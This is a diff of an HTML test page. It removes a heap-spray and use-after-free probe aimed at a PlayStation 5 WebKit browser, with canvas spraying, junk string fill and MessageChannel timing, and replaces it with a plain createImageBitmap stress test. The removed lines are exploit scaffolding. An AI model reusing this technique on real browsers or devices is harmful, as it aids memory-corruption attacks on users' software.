@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>PS5 4.03 WebKit UAF Test</title>
+  <title>createImageBitmap Stress Test</title>
   <style>
     body {
       background: black;
@@ -16,88 +16,39 @@
   </style>
 </head>
 <body>
-  <h1>UAF Exploit Test - Canvas + MessageChannel</h1>
+  <h1>createImageBitmap Stress Test</h1>
   <div id="log">Running...</div>
   <script>
     const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-    let spray = [];
-    let canvases = [];
-    let ctxs = [];
-    let data = [];
+    async function stressTest() {
+      const canvas = document.createElement('canvas');
+      canvas.width = 1024;
+      canvas.height = 1024;
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = 'red';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-    // Fill the heap with canvas contexts
-    function heapSpray() {
-      for (let i = 0; i < 3000; i++) {
-        let c = document.createElement('canvas');
-        c.width = 64;
-        c.height = 64;
-        let ctx = c.getContext('2d');
-        ctx.fillStyle = 'red';
-        ctx.fillRect(0, 0, 64, 64);
-        let imgData = ctx.getImageData(0, 0, 64, 64);
+      const iterations = 1000;
+      let bitmaps = [];
 
-        canvases.push(c);
-        ctxs.push(ctx);
-        data.push(imgData);
-      }
-      log("[+] Heap spray: Created 3000 canvases and captured ImageData");
-    }
-
-    // Junk heap with large strings
-    function fillJunk() {
-      for (let i = 0; i < 5000; i++) {
-        spray.push("A".repeat(1024));
-      }
-      log("[+] Junk fill: 5000 large strings added to heap");
-    }
-
-    // Use MessageChannel to trigger async GC
-    function triggerGC(callback) {
-      let { port1, port2 } = new MessageChannel();
-      port1.onmessage = () => {
-        log("[+] GC Triggered via MessageChannel");
-        callback();
-      };
-      port2.postMessage(null);
-    }
-
-    function attemptUAF() {
-      // Clear canvas refs (simulate freeing)
-      ctxs = null;
-      canvases = null;
-
-      triggerGC(() => {
-        // Attempt use-after-free via putImageData
-        let corrupted = false;
-        for (let i = 0; i < data.length; i++) {
-          try {
-            let canvas = document.createElement('canvas');
-            canvas.width = 64;
-            canvas.height = 64;
-            let ctx = canvas.getContext('2d');
-            ctx.putImageData(data[i], 0, 0);
-          } catch (e) {
-            log("[-] Exception on putImageData: " + e);
-            corrupted = true;
+      for (let i = 0; i < iterations; i++) {
+        try {
+          const bitmap = await createImageBitmap(canvas);
+          bitmaps.push(bitmap);
+          if (i % 100 === 0) {
+            log(`[+] Created ${i} bitmaps`);
           }
+        } catch (e) {
+          log(`[-] Exception at iteration ${i}: ${e}`);
+          break;
         }
-        if (!corrupted) {
-          log("[+] putImageData completed, check for visual anomalies or crash");
-        }
-      });
+      }
+
+      log("[+] Stress test completed");
     }
 
-    // Run all steps with delays
-    setTimeout(() => {
-      heapSpray();
-      setTimeout(() => {
-        fillJunk();
-        setTimeout(() => {
-          attemptUAF();
-        }, 1000);
-      }, 1000);
-    }, 100);
+    stressTest();
   </script>
 </body>
 </html>
